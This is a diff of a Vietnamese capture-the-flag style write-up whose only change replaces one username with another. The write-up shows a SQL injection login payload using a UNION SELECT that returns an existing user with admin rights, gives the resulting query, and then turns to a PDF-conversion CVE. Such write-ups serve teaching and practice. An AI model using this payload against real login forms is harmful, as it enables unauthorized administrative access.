@@ -50,18 +50,18 @@ class Users(db):
     is_admin = Column(Boolean, default=True)
 ```
 
-Như vậy để có thể login với user có quyền admin ta tạo tài khoản với user bất kỳ. Ở đây là `trungpq`, sau đó ta sẽ login với `username` như sau:
+Như vậy để có thể login với user có quyền admin ta tạo tài khoản với user bất kỳ. Ở đây là `shisuite`, sau đó ta sẽ login với `username` như sau:
 
 ```
-' union select id, username, password, 1 from users where username%3d'trungpq
+' union select id, username, password, 1 from users where username%3d'shisuite
 ```
 
 Như vậy câu query sẽ trở thành
 ```
-SELECT * FROM users WHERE username = '' union select id, username, password, 1 from users where username='trungpq'
+SELECT * FROM users WHERE username = '' union select id, username, password, 1 from users where username='shisuite'
 ```
 
-Nó sẽ trả về user `trungpq` nhưng mà có quyền admin
+Nó sẽ trả về user `shisuite` nhưng mà có quyền admin
 
 ### CVE-2023-33733
 Do có chức năng liên quan tới chuyển file txt thành pdf trong file `app.py` (/convert, /view_pdf), mình đã cố tìm cách để có thể khai thác bằng cách tìm điểm yếu trong code nhưng hardcore vcl.
